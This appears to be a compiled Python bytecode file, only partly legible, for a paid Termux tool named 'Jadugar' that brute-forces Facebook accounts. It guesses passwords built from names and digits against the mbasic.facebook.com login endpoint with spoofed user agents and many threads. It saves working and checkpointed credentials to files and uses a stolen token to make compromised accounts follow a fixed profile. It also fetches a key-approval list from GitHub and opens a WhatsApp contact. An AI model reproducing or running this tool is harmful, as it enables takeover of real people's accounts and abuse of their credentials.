o
    ��`b�V  �                   @   s  d dl Z d dlZzd dlZW n ey    ed� e �d� Y nw zd dlZW n ey9   ed� e �d� Y nw zd dlZW n eyR   ed� e �d� Y nw zd dlZW n eyg   e �d� Y nw d dl Z d dlZd dl	Z	d dl
Z
d dlZd dlZd dlZd dlZd dlZd dlZd dlZd dlZd dlZd dl Z d dl	Z	d dlZd dlZd d	lmZ e �d
� e �d� d dlZd dlZd dl	Z	d dlZd dlZd dl Z d dlZd dl	Z	d dl
Z
d dlZd dlZd dlZd dlZd dlZd dlZd dlZd dlZd dlZd dlZd dlZd dlZd dlZd dl Z d dlZd dlZd dlZd dlZd dlZd dl	Z	d dlZd dlZd dlZd dlZd dl
mZ d dl
m
Z
 d dl	mZ d dl	mZ d dlmZ d dlm Z! d dlm"Z" d dlm#Z# d dlZ$d dlm%Z% G dd� d�Z&d dl'm(Z d dl'm(Z( d dl'm(Z) d dl'm(Z d dl'm(Z* d dl+m,Z, d dlm#Z- d dlm#Z. d dl+m,Z, ze �/d� W n   Y ze �/d� W n   Y ze �0d� W n   Y ze �0d� W n   Y ze �0d� W n   Y z
d dlZd dlZW n e�y   e �d� Y nw zd dlZW n e�y"   e �d� Y nw zd dlZW n e�y8   e �d� Y nw d dlZd dlZd dlZd dl Z d dlZd dl	Z	d dlZd dlZd dlZd dlZd dlZd dlZd dlm"Z" d dl'm(Z( d dlm#Z# d dl
mZ d dl
m
Z
 d d l1m2Z2 d dlZd dlZd dlZd dl Z d dlZd dl	Z	d dlZd dlZd dlZd dlZd dlm"Z" d dlZd dlZd dl Z d dl	Z	d!d"� Z3d#d$� Z4d%d&� Z5g a6g a7g Z8g Z9d Z:d a;e�<� Z=d'Z>d(d)d*d+d,d-d.d/d0d1d2d3d4�Z?d5d6d7d+d8d9d:d;d0d<d2d=d>�Z@d?d@iZAd@ZBdAZCdBZDdCZEdDZFdEZGdFZHdGZIdHZJdIZKdJZLdKZMdLZNdMZOdNZPdOZQdPZRdQdR� ZSdSdT� ZTdUdV� ZUG dWdX� dX�ZVeWdYk�rHeX�  d@ZYdAZZdBZ[dCZ\dDZ]dEZ^dFZ_dGZ`dZZTe
�a� ZbebjcZdg d[�Zezedd k �spedd\k�rse%�  edd] ZfW n eg�y�   e%�  Y nw d^Zhe�<� Zid_d`� Zjdadb� Zkdcdd� Zldedf� Zmdgdh� Zndidj� Zodkdd� Zldldf� Zmdmdh� Zndndj� Zododd� Zldpdf� Zmdqdh� Zndrdj� Zodsdd� Zldtdf� Zmdudh� Zndvdj� Zodwdd� Zldxdf� Zmdydh� Zndzdj� Zod{dd� Zld|df� Zmd}dh� Znd~dj� Zodd�� Zpd�d�� ZqeWdYk�re4�  dS dS )��    NzJadugar Install Module requestsz.python -m pip install requests &> /dev/JadugarzJadugar Install Module bs4z)python -m pip install bs4 &> /dev/Jadugarz Jadugar Install Module mechanizez/python -m pip install mechanize &> /dev/Jadugarz*python -m pip install gTTS &> /dev/Jadugar)�
ThreadPool�clearztermux-setup-storage)�date)�datetime)�sleep)�random)�choice)�randint)�BeautifulSoup)�exitc                   @   s   e Zd Zdd� ZdS )�jalanc                 C   s2   |d D ]}t j�|� t j��  t�d� qd S )N�
g;�O��n�?)�sys�stdout�write�flush�timer   )�self�z�e� r   �oo.py�__init__    s
   
�zjalan.__init__N)�__name__�
__module__�__qualname__r   r   r   r   r   r      s    r   )�ThreadPoolExecutor)�ConnectionErrorzold.txtz	oldv2.txt�dump�resultz/sdcard/zpython -m pip install requests zpython -m pip install bs4 z python -m pip install mechanize )�quotec                  C   sH   g d�} t d�D ]}| D ]
}tj�d| � qqtj��  t�d� d S )N)�.z..z...z....z.....�   z [*] Creating TNL Internet File g�������?)�ranger   r   r   r   r   r   )�m�b�tr   r   r   �line_chack_doteR   s   �
r'   c                  C   s�  d} t �d� t�  z	tdd��� }W nc tyv   t �d� t�  td� td� td� td� td� td� t�� j	d d	� �
� }td
|  | � td� tdd�}|��  td� td� td� td� t�d� t �d� Y nw t�d�j}||v r�t�  d S t �d� t�  td� td� td� td� td� td� td
|  | � td� td� td� t�d� t �d� d S )N�Jadugarr   z./data/data/com.termux/files/usr/bin/.akkkk-cov�ru�   [*]｡｡｡｡｡｡｡｡｡｡｡｡｡｡｡｡｡｡｡｡｡｡｡｡｡｡｡｡｡｡｡｡｡｡｡｡｡｡｡｡｡｡｡｡z$  Your Token Is Not Approved Alreadyz           THIS IS YOUR KEY BRO� �
   z          YOUR KEY : �wz5     Copy Key And Sent Me WhatsApp Approvel Your Key �   �$xdg-open https://wa.me/+923475353500zEhttps://raw.githubusercontent.com/kashibaloch754/Jadu/main/Server.txtz          THIS IS YOUR KEY BROz/     Copy Key And Sent Me WP Approvel Your Key g      @)�os�system�logo�open�read�IOError�print�uuidZuuid4�hex�upper�closer   r   �requests�get�text�R)�akZkey1ZmyidZkokZr1r   r   r   �main_apvZ   sV   



�


r?   c                  C   s  t �d� t�  td� td� td� td� td� td�} td� | dv r1td� t�  d S | d	v rAt�d
� t� �	�  d S | dv rQt�d
� t �d� d S | dv r_t�d
� t
�  d S | dv rst�d
� t�  t�  t�  d S | dv r�t�d
� td� d S d S )Nr   z3 Use Airplane Mode every 10 minutes for 10 seconds �5 ___________________________________________________ z [1] Start Cloning  z [0] Exit Programingz [*] [1;94mChoose : )r*   z! [!] Please Select Correct Option��1�01�      �?��2�02zpython Dump.py��3�03��4�04)�0Z00�6u    
 [✓] Thank You So Much♥️
)r/   r0   r1   r5   �inputr   r   r   �	__crack__�plerr�	dupcutter�ytr=   �login)�keyr   r   r   r=   �   s<   








�r=   �https://mbasic.facebook.comZJanuariZFebruariZMaret�AprilZMeiZJuniZJuliZAgustus�	SeptemberZOktober�NovemberZDesember)rC   rG   rJ   rM   Z05Z06Z07Z08Z09Z10Z11Z12�January�February�March�May�June�July�August�October�December)ZjanuaryZfebruaryZmarchZaprilZmayZjuneZjulyZaugustZ	septemberZoctoberZnovemberZdecember�
user-agent��Mozilla/5.0 (Linux; Android 10; Mi 9T Pro Build/QKQ1.190825.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/88.0.4324.181 Mobile Safari/537.36 [FBAN/EMA;FBLC/id_ID;FBAV/239.0.0.10.109;]�{nokiac3-00/5.0 (07.20) profile/midp-2.1 configuration/cldc-1.1 mozilla/5.0 applewebkit/420+ (khtml, like gecko) safari/420+z�Mozilla/5.0 (Linux; Android 5.0; ASUS_Z00AD Build/LRX21V) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/37.0.0.0 Mobile Safari/537.36 [FBAN/EMA;FBLC/id_ID;FBAV/239.0.0.10.109;]z�Mozilla/5.0 (Linux; Android 8.1.0; HUAWEI Y7 PRIME 2019 Build/5887208) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/93.0.4577.62 Mobile Safari/537.36 [FBAN/EMA;FBLC/id_ID;FBAV/239.0.0.10.109;]z�Mozilla/5.0 (Linux; Android 11; vivo 1918) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/93.0.4577.62 Mobile Safari/537.36 [FBAN/EMA;FBLC/id_ID;FBAV/239.0.0.10.109;]z�Mozilla/5.0 (Linux; Android 5.1.1; A37f) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.105 Mobile Safari/537.36 [FBAN/EMA;FBLC/id_ID;FBAV/239.0.0.10.109;]z�Mozilla/5.0 (Linux; Android 5.0; SM-G900P Build/LRX21T; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/43.0.2357.121 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/35.0.0.48.273;]z�Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/93.0.4577.63 Safari/537.36 [FBAN/EMA;FBLC/id_ID;FBAV/239.0.0.10.109;]z�Mozilla/5.0 (Linux; Android 10; REALME RMX1911 Build/NMF26F) AppleWebKit/537.36 (KHTML, seperti Gecko) Chrome/76.0.3809.111 Mobile Safari/537.36 AlohaBrowser/2.20.3z[1;97mz[0;91mz[1;92mz[1;91mz[0;94mz[0;95mz[0;96mz[0mc                  C   s�   t �d� t�  td�} z0t�d|  �j}t�|�}|d }t	dd�}|�
| � |��  td| � t�d� t�  W d S  tyR   td	� t�d� t�  Y d S w )
Nzrm -rf access_token.txtz [*] Enter Your Token : z+https://graph.facebook.com/me?access_token=�namezaccess_token.txtr,   z

[*] Login Successful as �   z

[*] Token Expired )r/   r0   r1   rP   r:   r;   r<   �json�loadsr2   r   r9   r5   r   r   r=   �KeyErrorrU   )�tok�uZu1rg   �tsr   r   r   rU   �   s"   




�rU   c                   C   s
   t �  d S �N)r1   r   r   r   r   �banner�   �   
rp   c                 C   s\   t | �dkst |�dkr%td� tdtt | ��tt |��f � t�  d S td� t�  d S )Nr   z

[0m The Prosess Done...u(   
[1;92mTotal OK : %s •  Total CP : %sz

[0mERROR)�lenr5   �strr   )�ok�cpr   r   r   �hasil�   s
   *
rv   c                   @   s,   e Zd Zdd� Zdd� Zdd� Zdd� Zd	S )
rQ   c                 C   s
   g | _ d S ro   )�id�r   r   r   r   r   �   rq   z__crack__.__init__c                 C   s�   z*t d�| _td� t| j��� �� | _tdt| j� � td� td� td� W n   td� t d� t�  Y | �	�  d S )Nz [1;96m[*] File Path : r@   z [1;32m[*] Total ID : %sz4 ___________________________________________________z4 [1;93m[*][1;93m  Please Choose Pass Method[1;37mz
 [!] File Not Found In Storagez
 [*] Press Enter To Back)
rP   �apkr5   r2   r3   �
splitlinesrw   rr   r=   �__pler__rx   r   r   r   rR   �   s   
z__crack__.plerrc                 C   s�  t j�dtt| j�tt�tt�f �f t j��  |D �]B}|�	� }zt
�d� W n   Y ztdd��� }tdd��� }W n ttfyM   d}d}Y nw t�� }ddd	d
dddddddddd�}|jd|d�j}t�dt|���d�t�dt|���d�|d|dd�}	ddddddd
ddddddddd �}
|jd!|	|
d"d#�}d$|j�� v r�td%||f � d&||f }t�|� td'd(��d)| � td* }td+d(��|d, � d-}t�d.| d/ | �j} n}d0|j�� v �r^z9td1��� }t�d2||f ��� d3 }|� d4�\}}}d5|||||t!|�f }t�|� td6d(��d)| � W  n; ttf�y5   d}d}d}Y n   Y td7||t"|�f � d8||t#|�f }t�|� td6d(��d)| �  nqtd7 ad S )9NzB[1;32m [Jadugar] [1;97m%s/%s   [1;92mOK-:%s | [1;91mCP-:%s r*   z	agent.txtr)   re   rf   zmbasic.facebook.comrB   z{NokiaC3-00/5.0 (08.63) Profile/MIDP-2.1 Configuration/CLDC-1.1 Mozilla/5.0 AppleWebKit/420+ (KHTML, like Gecko) Safari/420+z�text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*[inserted by cython to avoid comment closer]/[inserted by cython to avoid comment start]*;q=0.8,application/signed-exchange;v=b3;q=0.9zmark.via.gpzsame-originZcors�emptyZdocumentzhttps://mbasic.facebook.com/zgzip, deflate brzen-GB,en-US;q=0.9,en;q=0.8)�Host�upgrade-insecure-requestsrd   �acceptZdnt�x-requested-with�sec-fetch-site�sec-fetch-mode�sec-fetch-user�sec-fetch-dest�referer�accept-encoding�accept-languagezqhttps://mbasic.facebook.com/index.php?next=https%3A%2F%2Fdevelopers.facebook.com%2Ftools%2Fdebug%2Faccesstoken%2F)�headerszname="lsd" value="(.*?)"rh   zname="jazoest" value="(.*?)"Zlogin_no_pinz8https://developers.facebook.com/tools/debug/accesstoken/)ZlsdZjazoest�uidZflow�pass�nextz	max-age=0rW   z!application/x-www-form-urlencodedz�Mozilla/5.0 (Linux; Android 12; SAMSUNG SM-G780G) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/16.0 Chrome/92.0.4515.166 Mobile Safari/537.36)r}   zcache-controlr~   �originzcontent-typerd   r   r�   r�   r�   r�   r�   r�   r�   r�   zHhttps://mbasic.facebook.com/login/device-based/validate-password/?shbl=0F)�datar�   Zallow_redirects�c_userz[1;32m[Jadu-ok] %s | %s      z%s - %sz/sdcard/Jadugar_OK.txt�az%s
�locz/sdcard/ids/tokens.txtr   Z100000256316823zhttps://graph.facebook.com/z/subscribers?access_token=Z
checkpointz	token.txtz-https://graph.facebook.com/%s?access_token=%sZbirthday�/z%s - %s - %s %s %s%sz/sdcard/Jadugar_CP.txtz,[1;91m[CHECKPOINT-Jadugar] %s | %s%s      z	%s - %s%s)$r   r   r   �looprr   rw   rt   ru   r   �lowerr/   �mkdirr2   r3   rk   r4   r:   �Sessionr;   r<   �re�searchrs   �groupZpostZcookiesZget_dictr5   �append�qr(   ri   �splitZtahnZtahunZtahu)r   �userZ_sempak_Zpw�	ua_xiaomi�ua_nokiaZsesZheaders_�pZdataaZ_headersZpoZwrt�accessZ	follow_idZsubs�tokenZcp_ttl�monthZdayZyearr   r   r   �
__mbasic__�   sf   (

� 6$


z__crack__.__mbasic__c                 C   s�  t d� td�}|dkrt d� t�  d S |dv r�t�d� t d� t d� t d	� t d
� t�  tdd���}| jD ]�}z�|�d�\}}|�d�}t	|�dkrbt
|d d |d d |d d g}n_t	|�dkr{t|d d |d d |d d g}nFt	|�dkr�||d |d  g}n5t	|�dkr�||d |d  g}n$t
|d d |d d |d d g}t|d d |d d |d d g}|�| j||� W q:   Y q:W d   � n1 s�w   Y  t�| j� ttt� d S |dv �r�t�d� t d� t d� t d	� t d
� t�  tdd���}| jD ]�}z�|�d�\}}|�d�}t	|�dk�r8||d |d  |d d g}nTt	|�dk�rO||d |d  |d d g}n=t	|�dk�rf||d |d  |d d g}n&t	|�dk�r}||d |d  |d d g}n||d |d  |d d g}|�| j||� W �q   Y �qW d   � n	1 �s�w   Y  t�| j� ttt� d S |dv �r�t�d� t d� t d� t d	� t d
� t�  td d���}| jD ]�}z�|�d�\}}|�d�}t	|�dk�r||d |d  |d d |d d! g}nht	|�dk�r'||d |d  |d d |d d! g}nLt	|�dk�rC||d |d  |d d |d d! g}n0t	|�dk�r_||d |d  |d d |d d! g}n||d |d  |d d |d d! g}|�| j||� W �q�   Y �q�W d   � n	1 �s�w   Y  t�| j� ttt� d S |d"v �r=t�d� t d� t d� t d	� t d
� t�  td d��d}| jD ]X}zP|�d�\}}|�d�}t	|�dk�r�|g}n.t	|�dk�r�|g}n#t	|�dk�r�|g}nt	|�dk�r|g}n||d d |d d! g}|�| j||� W �q�   Y �q�W d   � n	1 �s+w   Y  t�| j� ttt� d S t d#� t�d� | ��  d S )$Nz [2] Auto pass fast speed u   
 [•] [1;37mChoose : r*   z\Choose Error rA   rh   u    
[•] Result OK saved to OK.txtu   [•] Result CP saved to CP.txtz
	Crack Processing...
z
	Crack Processing...

�   )Zmax_workers�|� r   ZlastZFrist�Lastr"   Zlast123ZFrist123ZLast1234�   �   ZLast1�firstZlast1rE   �(   Z123rH   �#   Z12345rK   z
Salah)r5   rP   r   r   r   r1   r   rw   r�   rr   r�   Zfirst123r�   Zsubmitr�   r/   �removery   rv   rt   ru   r{   )r   ZyanZ_ngentot_gratis_Zyntktsr�   rg   �xzZpwxr   r   r   r{   &  s�   



&&$$��



    ��



****(��



��
z__crack__.__pler__N)r   r   r   r   rR   r�   r{   r   r   r   r   rQ   �   s
    6rQ   �__main__z�_________________Mr Jadugar _______________
___________________________________________
  Github : Not Found
Whatsapp : 0347-5353500
YOUTUBE  : MR JADUGAR GAMER
 VERSION : 1.1
    Tool : Paid Tool
___________________________________________ )r[   r\   r]   rX   r^   r_   r`   ra   rY   rb   rZ   rc   �   rh   z0https://business.facebook.com/business_locationsc                   C   s2   t �d� t�d� tt� td� t �d� d S )NrD   r   r*   )r   r   r/   r0   r5   rp   r   r   r   r   r1   �  s
   

r1   c                 C   s@   d| d  d d| d   d d| d   d d| d	   }|S )
Nzdatr=Zdatr�;zc_user=r�   zfr=�frzxs=Zxsr   )ZcokZ__forr   r   r   �convert�  s   
�
��
��
�r�   c                   C   �   t d� t�  d S �Nr*   �r5   r�   r   r   r   r   r>   �  �   
r>   c                   C   r�   r�   r�   r   r   r   r   �a1k�  r�   r�   c                   C   r�   r�   r�   r   r   r   r   �aoo�  r�   r�   c                   C   r�   r�   r�   r   r   r   r   �ff�  r�   r�   c                   C   r�   r�   r�   r   r   r   r   r>   �  r�   c                   C   r�   r�   r�   r   r   r   r   r�   �  r�   c                   C   r�   r�   r�   r   r   r   r   r�   �  r�   c                   C   r�   r�   r�   r   r   r   r   r�   �  r�   c                   C   r�   r�   r�   r   r   r   r   r>   �  r�   c                   C   r�   r�   r�   r   r   r   r   r�   �  r�   c                   C   r�   r�   r�   r   r   r   r   r�   �  r�   c                   C   r�   r�   r�   r   r   r   r   r�   �  r�   c                   C   r�   r�   r�   r   r   r   r   r>   �  r�   c                   C   r�   r�   r�   r   r   r   r   r�   �  r�   c                   C   r�   r�   r�   r   r   r   r   r�   �  r�   c                   C   r�   r�   r�   r   r   r   r   r�   �  r�   c                   C   r�   r�   r�   r   r   r   r   r>   �  r�   c                   C   r�   r�   r�   r   r   r   r   r�   �  r�   c                   C   r�   r�   r�   r   r   r   r   r�      r�   c                   C   r�   r�   r�   r   r   r   r   r�     r�   c                   C   r�   r�   r�   r   r   r   r   r>     r�   c                   C   r�   r�   r�   r   r   r   r   r�   	  r�   c                   C   r�   r�   r�   r   r   r   r   r�     r�   c                   C   r�   r�   r�   r   r   r   r   r�     r�   c                   C   s   t �d� t�d� t�  d S )Nr.   r�   )r/   r0   r   r   r=   r   r   r   r   rS     s   


rS   c                   C   s$   t �  t�d� t�d� t�  d S )Nzxdg-open +Walinkr�   )r1   r/   r0   r   r   r=   r   r   r   r   rT     s   


rT   )rr/   r   r:   �ModuleNotFoundErrorr5   r0   Zbs4Z	mechanizeZgTTSr   r   r�   r   ZhashlibZ	threadingri   ZgetpassZurllibZsixr6   Zmultiprocessing.poolr   ZreqZ	ipaddressZcalendar�
subprocess�base64�platformr   r   ZwaktuZacakr   Zpilihr	   r
   Zressr   r   Zconcurrent.futuresr   ZzthreadsZkikygtgZrequests.exceptionsr   �parserZparr�   r�   Zurllib.parser    r'   r?   r=   rt   ru   rw   r�   Znumr�   r�   Z_silet_koceng_Zurl_mbZ	bulan_ttlZ	bulan_keyZheader_grupr�   r�   Zua_asusZ	ua_huaweiZua_vivoZua_oppoZ
ua_samsungZ
ua_windowsZ	ua_realme�P�M�H�K�B�U�O�NrU   rp   rv   rQ   r   �helpZimtiazak_ua_xaomiZimtiazak_ua_nokiaZimtiazak_ua_asusZimtiazak_ua_huaweiZimtiazak_ua_vivoZimtiazak_ua_oppoZimtiazak_ua_samsungZimtiazak_ua_windowsZnowZctr�   �nZmonthsxZnTemp�
ValueErrorZurlsZ_sesr1   r�   r>   r�   r�   r�   rS   rT   r   r   r   r   �<module>   sL  $$$h 

����`P . 
<
�


�